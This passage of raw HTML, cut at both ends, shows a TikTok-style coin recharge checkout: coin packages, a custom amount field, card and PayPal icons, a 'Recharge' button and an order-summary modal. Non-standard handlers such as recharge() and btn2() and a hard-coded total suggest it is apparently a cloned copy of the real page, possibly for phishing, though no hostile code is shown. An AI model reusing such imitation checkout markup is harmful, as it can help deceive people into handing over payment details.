24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-num-3">700</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-price-3">$US 10,00</span></div></button></li><li onclick="btn2()"><button class="tiktok-l4v9n8-ButtonContainer e4yj8b60" id="platform5" onclick="Selectedplatform(&quot;platform5&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-num-4">1,400</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-price-4">$US 20,00</span></div></button></li><li onclick="btn2()"><button class="tiktok-l4v9n8-ButtonContainer e4yj8b60" id="platform6" onclick="Selectedplatform(&quot;platform6&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62" data-e2e="wallet-package-coin-icon-5"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-num-5">3,500</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-price-5">$US 50,00</span></div></button></li><li onclick="btn2()"><button class="tiktok-l4v9n8-ButtonContainer e4yj8b60" id="platform7" onclick="Selectedplatform(&quot;platform7&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62" data-e2e="wallet-package-coin-icon-6"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-num-6">17,500</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-price-6">$US 250,00</span></div></button></li><li id="btn1" onclick="btn1()" style="display: none;"><button aria-label="Custom" aria-selected="false" class="e4yj8b60 tiktok-l4v9n8-ButtonContainer" data-e2e="wallet-package-custom" id="platform8" onclick="Selectedplatform(&quot;platform8&quot;)"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><span class="tiktok-10lqs59-SpanNumDisplay e4yj8b63" data-e2e="wallet-package-coin-text-custom">Custom</span></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-text-custom">Large amount supported</span></div></button></li><style>.tiktok-1xsxoj2-ButtonContainer{width:100%;min-height:96px;position:relative;display:flex;flex-direction:column;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;padding:17px 2px 15px;border-radius:4px;border:2px solid #face15;cursor:pointer;pointer-events:initial;opacity:1;background-color:transparent}.tiktok-16jd2dh-DivNumContainer{height:32px;display:flex;-moz-box-align:center;align-items:center}.tiktok-240y52-SpanNumIcon{height:32px}.tiktok-kkwvro-StyledCoinIcon{width:32px;height:32px}.tiktok-1tgzr1h-InputNum{width:134px;background-color:transparent;border-width:medium medium 1px;border-style:none none solid;border-color:currentcolor currentcolor #161823;border-image:none;outline:0;text-align:center;color:#161823;font-weight:700;font-family:TikTokDisplayFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:24px;line-height:30px;letter-spacing:.24px}.tiktok-1uetk1w-DivTextContainer{height:20px;margin-top:8px;display:flex}.tiktok-hpayk8-SpanTextNow{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:14px;letter-spacing:.093px;color:rgba(22,24,35,.5);text-align:center;line-height:1.1}</style><li id="btn2" style="display: block;"><button aria-label="Custom" aria-selected="true" class="tiktok-1xsxoj2-ButtonContainer e4yj8b60" data-e2e="wallet-package-selected" id="platform9" onclick="Selectedplatform(&quot;platform9&quot;)" style="border-color: rgb(250, 206, 21);"><div class="tiktok-16jd2dh-DivNumContainer e4yj8b61"><span class="tiktok-240y52-SpanNumIcon e4yj8b62"><svg class="tiktok-kkwvro-StyledCoinIcon e4yj8b611" data-e2e="" fill="none" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><circle cx="24" cy="24" fill="#FFEC9B" r="22"></circle><circle cx="24" cy="24" fill="#FACE15" r="17"></circle><path clip-rule="evenodd" d="M40.9347 25.5C40.9779 25.0058 41 24.5055 41 24C41 14.6112 33.3888 7 24 7C14.6112 7 7 14.6112 7 24C7 24.5055 7.02206 25.0058 7.06527 25.5C7.82466 16.8137 15.1166 10 24 10C32.8834 10 40.1753 16.8137 40.9347 25.5Z" fill="#FABC15" fill-rule="evenodd"></path><path d="M33 19C30.2041 19 27.9375 16.7614 27.9375 14H24.5625V27.6111C24.5625 29.2986 23.1774 30.6667 21.4688 30.6667C19.7601 30.6667 18.375 29.2986 18.375 27.6111C18.375 25.9236 19.7601 24.5556 21.4688 24.5556C21.722 24.5556 21.9659 24.5853 22.1981 24.6406C22.2365 24.6497 22.2747 24.6596 22.3125 24.6701V21.2763C22.0358 21.2406 21.7541 21.2222 21.4688 21.2222C17.8962 21.2222 15 24.0826 15 27.6111C15 31.1396 17.8962 34 21.4688 34C25.0413 34 27.9375 31.1396 27.9375 27.6111V20.6673C29.3477 21.7134 31.1005 22.3333 33 22.3333V19Z" fill="#FEF5CD"></path></svg></span><input class="tiktok-1tgzr1h-InputNum e4yj8b67" id="uid1" oninput="formatNumberWithCommas()" pattern="[0-9]*"></div><div class="tiktok-1uetk1w-DivTextContainer e4yj8b64"><span class="tiktok-hpayk8-SpanTextNow e4yj8b66" data-e2e="wallet-package-text-custom" id="minnumb" style="color: rgba(22, 24, 35, 0.5);">30-2,500,000</span></div></button></li></ol></div><div class="tiktok-11ddo6h-DivTotalContainer e1sbo8o80"><ul class="tiktok-fbshyx-UlPaymentMethodsContainer e1sbo8o81"><li><span class="tiktok-1sjzc7n-SpanTotalText e1sbo8o82" data-e2e="wallet-title-payment-method">Payment method</span></li><li><img alt="Visa" class="tiktok-1quc8c-ImgPaymentIcon e1sbo8o85" data-e2e="wallet-payment-icon-VISA" src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/visa_light_c558fb.svg"></li><li><img alt="Mastercard" class="tiktok-1quc8c-ImgPaymentIcon e1sbo8o85" data-e2e="wallet-payment-icon-MASTER" src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/mastercard-gray-update_7b3ceb.svg"></li><li><img alt="PAYPAL" class="tiktok-1quc8c-ImgPaymentIcon e1sbo8o85" data-e2e="wallet-payment-icon-PAYPAL" src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/paypal-light-border_4305a4.svg"></li></ul></div><div class="tiktok-1fguu8v-DivTotalContainer ep2pazl0"><span class="tiktok-b8ii2p-SpanTotalText ep2pazl5" data-e2e="wallet-title-total-price">Total</span><span class="tiktok-3m60iy-SpanTotalMount ep2pazl6" id="total">$ 111.11</span></div><div class="tiktok-vr1v8s-DivButtonContainer ep2pazl8"><button aria-label="Recharge" aria-live="polite" class="ep2pazl10 tiktok-174cudu-Button-StyledBuyButton ehk74z00" data-e2e="wallet-button-buynow" id="recharge" onclick="recharge()" type="button" style="color: rgb(255, 255, 255); background-color: rgb(254, 44, 85);">Recharge</button></div></div><button aria-label="FAQ" class="tiktok-1l1fdho-ButtonQuestionContainer eo5jqmb4"><svg class="tiktok-ze008l-StyledQnMarkIcon eo5jqmb3" data-e2e="" fill="currentColor" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z" fill-rule="evenodd"></path></svg></button></div></main></div><div class="tiktok-m2jnla-DivModalContainer e1gjoq3k0" style="z-index:1001;position:fixed"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div></div><div class="tiktok-m2jnla-DivModalContainer e1gjoq3k0" style="z-index:1001;position:fixed"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div></div><div class="tiktok-m2jnla-DivModalContainer e1gjoq3k0" style="z-index:10010;position:fixed"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div></div><script async="" src="https://lf16-tiktok-web.tiktokcdn-us.com/obj/static-tx/secsdk/secsdk-lastest.umd.js"></script><div class="tiktok-m2jnla-DivModalContainer e1gjoq3k0" style="z-index:1001;position:fixed"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div></div><div class="tiktok-m2jnla-DivModalContainer e1gjoq3k0" style="z-index:1001;position:fixed"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div></div><script crossorigin="anonymous" integrity="sha384-Y8xkOqTRo28f17d6SNCTpgb3iKAbOUdwtR9xYeLX4Ld5ZM5fF11qwZqnFKmfLHxG" src="https://lf16-tiktok-web.tiktokcdn-us.com/obj/tiktok-web-tx/webmssdk_ex/2.0.0.57/webmssdk_ex.js" type="text/javascript"></script><script async="" data-script-loaded="true" id="braintreeVenmo" src="https://js.braintreegateway.com/web/3.85.0/js/venmo.min.js"></script><script async="" data-script-loaded="true" id="braintreeDataCollector" src="https://js.braintreegateway.com/web/3.85.0/js/data-collector.min.js"></script><script async="" data-script-loaded="true" id="braintreeScript" src="https://js.braintreegateway.com/web/3.85.0/js/client.min.js"></script><iframe allowtransparency="true" id="venmo-desktop-iframe" name="venmo-desktop-iframe" scrolling="no" src="https://assets.braintreegateway.com/web/3.85.0/html/venmo-desktop-frame.html#PRODUCTION_f1c504aa-aeab-4708-820f-745168371667" style="display:none;position:fixed;inset:0px;height:100%;width:100%;z-index:9999999" title="Venmo Desktop" frameborder="0"></iframe><div data-venmo-desktop-id="f1c504aa-aeab-4708-820f-745168371667" role="alert" style="position:fixed;display:none;height:1px;width:1px;overflow:hidden;z-index:0"></div><iframe aria-hidden="true" id="ppfnfnclspbfiframe" src="about:blank" style="width:0;height:0;border:0 none;position:absolute;z-index:-999;top:-10000px;left:-10000px" tabindex="-1" title="pbf"></iframe><iframe allow="geolocation" aria-hidden="true" id="ppfnfnclsiframe" src="https://c.paypal.com/v1/r/d/i?js_src=https://c.paypal.com/da/r/fb.js" style="width:0;height:0;border:0 none;position:absolute;z-index:-999;top:-10000px;left:-10000px" tabindex="-1" title="ppfniframe"></iframe><style>.tiktok-py8jux-DivModalContainer{font-family:"Andale Mono",sans-serif;inset:0px;overflow:auto;outline:0;transition:all .5s cubic-bezier(.075, .82, .165, 1) 0s;opacity:1}.tiktok-v2a75e-DivModalMask{background:rgba(0,0,0,.5);position:absolute;inset:0px}.tiktok-1dw2wty-DivCenterWrapper{width:100vw;height:100%;display:flex;-moz-box-pack:center;justify-content:center;-moz-box-align:center;align-items:center}.tiktok-it2bln-DivContentContainer{position:relative;border-radius:8px;margin:auto;transition:all .3s cubic-bezier(.075, .82, .165, 1) 0s;transform:none;background-color:#fff;max-height:90%;overflow:auto}.tiktok-mzpspd-DivCashierPage{width:100%;min-width:800px;background:#fff;box-sizing:border-box}.tiktok-1ut32db-DivCashierContainer{font-family:TikTokFont;margin:auto;background-color:#fff;width:100%;max-width:880px;min-width:700px;padding:24px 24px 0;border-radius:4px;position:relative}.tiktok-j1fbsm-HeaderOrderSummaryTitle{font-size:24px;line-height:32px;color:#161823;font-weight:700;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;overflow:hidden;text-overflow:ellipsis;margin:0 -24px;padding:0 24px 24px;border-bottom:.5px solid rgba(22,24,35,.2)}.tiktok-197anyc-DivProfileRow{height:68px;display:flex;-moz-box-pack:justify;justify-content:space-between;-moz-box-align:center;align-items:center;border-bottom:1px solid #eeeef0}.tiktok-1ewhav3-SpanProfileDescription{color:#161823;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;line-height:21px;letter-spacing:.03px;font-size:18px}.tiktok-1vchfa7-DivProfileInfo{display:flex;-moz-box-align:center;align-items:center}.tiktok-15iwytd-DivProfileContainer{margin-left:24px;position:relative;width:32px;height:32px;background:center center/cover no-repeat;border-radius:50%;cursor:pointer}.tiktok-1nnllx5-SpanProfileUsername{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:18px;line-height:24px;letter-spacing:-.028px;margin-inline-start:8px}.tiktok-q8zfnj-DivOrderDetails{padding:14px 0;border-bottom:1px solid #eeeef0}.tiktok-19zzxh7-DivOrderSummaryContent{display:flex;-moz-box-pack:justify;justify-content:space-between;margin:2px 0;overflow:hidden;text-overflow:ellipsis;line-height:22px;font-size:14px;color:rgba(22,24,35,.75);font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif}.tiktok-1kkzega-DivOrderSummaryContent{display:flex;-moz-box-pack:justify;justify-content:space-between;margin:2px 0;overflow:hidden;text-overflow:ellipsis;line-height:22px;font-size:16px;color:#161823;font-weight:700;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif}.tiktok-qov981-DivLoadingWrapper{width:100%;height:100%}.tiktok-1eyyzw7-DivCardActionsContainer{position:relative;display:flex;height:20px;top:12px;z-index:99}.tiktok-1s7gs5w-Button-StyledCardManageBtn{border-width:1px;border-style:solid;border-radius:4px;display:flex;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;user-select:none;cursor:pointer;box-sizing:border-box;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:14px;letter-spacing:.093px;margin-right:0;margin-left:auto;background:0 0;border-color:transparent;box-shadow:none;padding:0;height:24px;line-height:24px;width:auto;min-width:auto;min-height:auto;position:relative;top:8px;right:0;font-weight:700;color:#fe2c55}.pipo{--pipo-pc-color-primary:#0057be;--pipo-pc-color-bg-primary:#ffffff;--pipo-pc-color-bg-secondary:#f5f6f7;--pipo-pc-color-input-fill:#86909c1c;--pipo-pc-color-negative:#ef4b18;--pipo-pc-color-text-primary:#1d2129;--pipo-pc-color-text-secondary:#4e5969;--pipo-pc-color-text-tertiary:#86909c;--pipo-pc-color-text-label:#4e5969;--pipo-pc-color-text-placeholder:#86909c;--pipo-pc-color-text-btn-secondary:#4e5969;--pipo-pc-color-text-marketing:#ff7d00;--pipo-pc-color-text-bg-marketing:#ff7d0033;--pipo-pc-font-size-display-primary:24px;--pipo-pc-font-size-title-primary:20px;--pipo-pc-font-size-title-secondary:18px;--pipo-pc-font-size-subtitle:16px;--pipo-pc-font-size-default:14px;--pipo-pc-font-size-label:13px;--pipo-pc-font-size-caption:12px;--pipo-pc-font-weight-title:700;--pipo-pc-font-weight-subtitle:500;--pipo-pc-font-weight-default:400;--pipo-pc-font-weight-label:600;--pipo-pc-opacity-disabled:0.34;--pipo-pc-color-border-line-secondary:#1618231f;--pipo-pc-border-radius-bg-primary:0px;--pipo-pc-color-primary-button-text:#fff;--pipo-pc-color-primary-button-text--disabled:#fff;--pipo-pc-color-primary-button-bg--disabled:#92a3d6;--pipo-pc-color-primary-button-bg--hover:#3c68c2;--pipo-pc-color-primary-border:#3c68c2;--pipo-pc-color-primary-alpha-11:#0057be1c;--pipo-pc-color-primary-alpha-6:#0057be0f;--pipo-pc-color-bg-primary-darker-1:#f5f5f5;--pipo-pc-color-bg-primary-darker-2:#ebebec;--pipo-pc-color-bg-primary-border:#eeeeee;--pipo-pc-color-bg-primary--hover:#e0e0e0;--pipo-pc-color-text-primary-alpha-60:#1d212999;--pipo-pc-color-input-fill--hover:#7f889435;--pipo-pc-color-negative-bg:#ef4b181c;--pipo-pc-color-negative-bg--hover:#ef4b1842;outline:0}.pc-payment-list{padding:0;border-radius:4px;background-color:var(--pipo-pc-color-bg-primary)}.pipo-pc.pc-payment .pc-payment-list-title{margin-bottom:14px;padding-bottom:0;font-size:18px;line-height:24px;color:#161823;font-weight:700;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif}.pc-payment-list-title{display:flex;justify-content:space-between;opacity:.9}.pc-payment-list-bottom{margin-bottom:24px}.pc-payment-item{margin-bottom:16px;border:1px solid var(--pipo-pc-color-bg-primary-border);border-radius:2px;box-sizing:border-box;cursor:pointer}.arco-row-justify-space-between{justify-content:space-between}.arco-row-align-center{align-items:center}.arco-row{display:flex;flex-flow:row wrap}.pc-payment-item-content{align-content:center;padding:18px 18px 18px 15px}.pc-payment-item-left{display:flex}.flex-col{flex-direction:column}div.flex{height:22px;align-items:center}.flex{display:flex}.arco-radio{padding-right:0;padding-left:0;margin-left:0;margin-right:16px}.arco-radio{position:relative;cursor:pointer;display:inline-block;font-size:14px;line-height:unset}.arco-radio-mask-wrapper{top:0}.arco-radio-mask-wrapper{vertical-align:middle;background-color:red!important;border-color:red!important;position:relative;line-height:1}.arco-icon-hover{display:inline-block;cursor:pointer}.arco-radio-mask{background-color:#fe2c55!important;border-color:#fe2c55!important;display:block;box-sizing:border-box;height:14px;width:14px;border-radius:var(--border-radius-circle);position:relative;line-height:14px}.pc-payment-item-label{font-size:14px;line-height:22px;color:#161823;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700}.pc-payment-item-tag{display:flex;align-items:center}.pc-payment-item-right{display:flex;justify-content:flex-end;flex-wrap:wrap;height:20px}.ml-6{margin-left:6px}.pc-payment-item-right-img{width:32px;height:20px}.pc-payment-item{margin-bottom:16px;border:1px solid var(--pipo-pc-color-bg-primary-border);border-radius:2px;box-sizing:border-box;cursor:pointer;line-height:1.5}.arco-row-justify-space-between{justify-content:space-between}.arco-row-align-center{align-items:center}.arco-row{display:flex;flex-flow:row wrap}.pc-payment-item-content{align-content:center;padding:18px 18px 18px 15px}.tiktok-1quj9yy-FooterContainer{margin:auto;background-color:#fff;width:100%;max-width:880px;padding:0 24px;border-radius:4px;overflow:auto}.tiktok-84khz2-DivCashierFooterTextContainer{display:flex;margin-bottom:8px}.tiktok-1lkcylx-DivCashierFooterText{font-family:TikTokFont;overflow:hidden}.tiktok-2mck4x-TextContainer{box-sizing:border-box;margin-block:0px;font-size:var(--tux-fontSizeP4);line-height:1.5;font-family:"Andale Mono",sans-serif;font-weight:var(--tux-fontWeightRegular);color:var(--tux-colorTextTertiary)}.tiktok-1w73l1x-ACashierFooterLink{color:#161823;cursor:pointer;font-weight:700}.tiktok-l41yxy-DivRegionChangeText{margin-top:8px}.tiktok-1vl1wgs-SpanBoldText{font-weight:600;color:#161823}.tiktok-1vl1wgs-SpanBoldText{font-weight:600;color:#161823}.tiktok-1m6nl1r-Button{box-sizing:border-box;appearance:none;height:1.5em;display:inline-flex;-moz-box-pack:center;justify-content:center;-moz-box-align:center;align-items:center;padding:0;font-family:var(--tux-fontFamilyParagraph);font-weight:var(--tux-fontWeightSemibold);border:medium;background-color:transparent;text-decoration:none;cursor:pointer;gap:2px;font-size:var(--tux-fontSizeP4);color:var(--tux-colorTextPrimary)}.tiktok-1fbpw1u-ButtonLabel{white-space:nowrap;text-overflow:ellipsis;overflow:hidden}.tiktok-k6ibtx-DivButtonsContainer{display:flex;-moz-box-align:center;align-items:center;-moz-box-pack:end;justify-content:flex-end;flex-flow:wrap;height:84px;border-top:.5px solid rgba(22,24,35,.2)}.tiktok-1nf9zwy-Button-StyledCashierHelpButton{border-width:1px;border-style:solid;border-radius:4px;color:#161823;border-color:rgba(22,24,35,.12);background-color:#fff;min-height:36px;line-height:25px;font-weight:600;font-family:TikTokDisplayFont,PingFangSC,sans-serif;display:flex;position:relative;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;padding:6px 8px;user-select:none;cursor:pointer;box-sizing:border-box;min-width:36px;font-size:20px;transform:none}.tiktok-aeo2ro-Button-StyledPayButton:disabled{border:medium;color:#fff;background-color:#fe2c55;pointer-events:none}.tiktok-xutjcp-DivCloseWrapper{position:absolute;top:24px;border-radius:50%;cursor:pointer;display:flex;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;z-index:1;right:24px;width:24px;height:24px}.tiktok-xutjcp-DivCloseWrapper{cursor:pointer}.tiktok-aeo2ro-Button-StyledPayButton{border-radius:4px;border:medium;color:#fff;background-color:#fe2c55;min-height:36px;display:flex;position:relative;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;padding:6px 8px;user-select:none;cursor:pointer;box-sizing:border-box;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:16px;line-height:21px;letter-spacing:.03px;min-width:140px;height:36px;margin-inline-start:8px}input[type=radio]:after{width:20px;height:20px;border-radius:15px;top:-2px;left:-1px;position:relative;background-color:#d1d3d1;content:'';display:inline-block;visibility:visible;border:2px solid #fff;color:#fe2c55}input[type=radio]:checked:after{width:17px;height:17px;border:5px solid #fe2c55;background-color:#fff}</style><div class="tiktok-py8jux-DivModalContainer e1gjoq3k0" id="main2" style="z-index: 1001; position: fixed; display: none;"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div><div data-focus-guard="true" style="width:1px;height:0;padding:0;overflow:hidden;position:fixed;top:1px;left:1px" tabindex="0"></div><div data-focus-lock-disabled="false"><div class="tiktok-1dw2wty-DivCenterWrapper e1gjoq3k7"><div class="tiktok-it2bln-DivContentContainer e1gjoq3k3" data-e2e="" id="login-modal" tabindex="0"><div class="tiktok-mzpspd-DivCashierPage egzga6o0"><div class="tiktok-1ut32db-DivCashierContainer egzga6o1"><header class="tiktok-j1fbsm-HeaderOrderSummaryTitle ed1ryg40" data-e2e="cashier-title-order-summary">Order summary<div class="tiktok-rp4zg0-SecureTextContainer e7nnpz73"><span class="tiktok-1nnmv9n-TextContainer eblccp10"><svg fill="currentColor" font-size="12" height="1em" style="position:relative;top:1px" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#Icon-Shield_Tick_svg__a)"><path d="m32.26 16.62-1.7-1.07a1.02 1.02 0 0 0-1.4.33l-6.65 10.66-3.6-4.1a1 1 0 0 0-1.42-.11l-1.52 1.33a1.01 1.01 0 0 0-.1 1.42l5.38 6.15a2 2 0 0 0 3.23-.26l8.1-12.96c.29-.48.15-1.1-.32-1.4Z"></path><path d="M5 10.53V23.2c0 14.16 14.76 21.85 18.26 23.47.48.22 1 .22 1.48 0C28.24 45.05 43 37.37 43 23.2V10.53c0-1.2-1.06-2.19-2.26-2.29-3.06-.26-8.88-1.53-15.35-7a2.17 2.17 0 0 0-2.78 0c-6.47 5.47-12.3 6.74-15.35 7C6.06 8.34 5 9.32 5 10.53ZM9 23.2V12.07c3.65-.54 9.1-2.17 15-6.81 5.9 4.64 11.35 6.27 15 6.8V23.2c0 5.58-2.88 10.06-6.56 13.53A37.06 37.06 0 0 1 24 42.58a37.07 37.07 0 0 1-8.43-5.85C11.89 33.26 9 28.78 9 23.2Z"></path></g><defs><clipPath 